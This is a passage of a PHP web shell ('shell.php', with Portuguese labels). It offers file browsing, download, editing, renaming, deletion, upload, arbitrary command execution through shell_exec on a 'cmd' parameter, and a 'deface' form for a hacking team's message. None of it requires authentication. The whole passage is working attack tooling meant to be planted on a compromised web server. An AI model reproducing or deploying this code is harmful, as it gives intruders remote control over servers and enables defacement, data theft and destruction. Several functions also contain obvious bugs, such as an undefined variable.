				echo "</tr>";
			}
			if($nome != "." && $nome !=".." && is_file($file)){
				echo "<tr>";	
				echo "<td>".$nome."</td>";
				echo "<td>".permissao("$dir/$nome")."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td><a href='#'>Visualizar</a></td>";
				echo "<td><a href='?download=$file'>Download</a></td>";
				echo "<td><a href='?renomear=$nome&pasta=$dir'>Renomear</a></td>";
				echo "<td><a href='?editar=$file'>Editar</a></td>";
				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
				echo "</tr>";
			}
		}
		echo "</table>";
	}

	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}

	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}

	function renomear($arquivo, $dir){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=pasta type=hidden value='$dir'>";
		echo "<input name=antigo type=hidden value='$arquivo'>";
		echo "<label>Novo nome:</label>";
		echo "<input name=renomear type=text value='$arquivo'>";
		echo "<br />";
		echo "<input type=submit value=renomear>";
		echo "</form>";
		exit();
	}

	function renomea_arquivo($novo, $antigo, $dir){
		rename("$dir/$antigo", "$dir/$novo");
		echo "Arquivo renomeado!";
	}

	function criar($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome do arquivo:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";
		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Conteudo:</label><br/>";
		echo "<textarea name=criar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=criar>";
		echo "</form>";
		exit();
	}

	function deface($diretorio){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<label>Nome da team:</label><br/>";
		echo "<input type='text' name='nome'/><br/>";

		echo "<label>Greatz:</label><br/>";
		echo "<input type='text' greatz='nome'/><br/>";

		echo "<input type='hidden' diretorio='$diretorio'/>";
		echo "<label>Mensagem:</label><br/>";
		echo "<textarea name=mensagem cols=100 rows=10>";
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=gerar deface>";
		echo "</form>";
		exit();
	}

	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}

	function deletar($arquivo){
		unlink($arquivo);
		echo "Arquivo deletado!";
	}

	function upar($diretorio){
		echo "
		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
			<input type='file' name='upload'/>
			<input type='hidden' diretorio='$diretorio'/>
			<input type='submit' value='Upar!'/>
		</form>";

	}


	function upload($arquivo, $diretorio){
		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
			echo "Upado com sucesso! :D";
		}
	}

	function navegar($diretorio){
		echo "
		<form class=upar action='shell.php' method='get'>
			<input style='width:220px' type='text' name='ls' value='$diretorio'/>
			<input type='submit' value='Acessar'/>
		</form>";

	}

	function executar($diretorio){
		echo "
		<form class=upar action='shell.php' method='get'>
			<input type='hidden' diretorio='$diretorio'/>
			<input style='width:210px' type='text' name='cmd' value=''/>
			<input type='submit' value='Executar'/>
		</form>";

	}

	function cmd($cmd, $diretorio){
		$res = shell_exec($cmd);
		echo $res;
	}

	// POST e GET ==================================================
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
		echo "Arquivo salvo!";
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}

	if($editar = $_GET['editar']){
		editar($editar);
	}

	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}

	if($upar = $_FILES['upload']){
		upload($upar, $diretorio);
	}

	if($cmd = $_GET['cmd']){
		cmd($cmd, $diretorio);
	}

	if($criar = $_POST['criar'] and $nome = $_POST['nome']){
		salvar($criar, "$diretorio/$nome");
		echo "Arquivo criado!";
	}

	if($renomear = $_GET['renomear'] and $dir = $_GET['pasta']){
		renomear($renomear, $dir);
	}

	if($renomear = $_POST['renomear'] and $pasta = $_POST['pasta'] and $antigo = $_POST['antigo']){
		renomea_arquivo($renomear, $antigo, $pasta);
	}

	if($novo = $_GET['novo']){
		criar($novo);
	}

	if($deface = $_GET['deface']){
		deface($deface);
	}

	// Shell =======================================================
	navegar($diretorio);
	listar($diretorio);
	upar($diretorio);
	executar($diretorio);

	?>
</body>
</html>
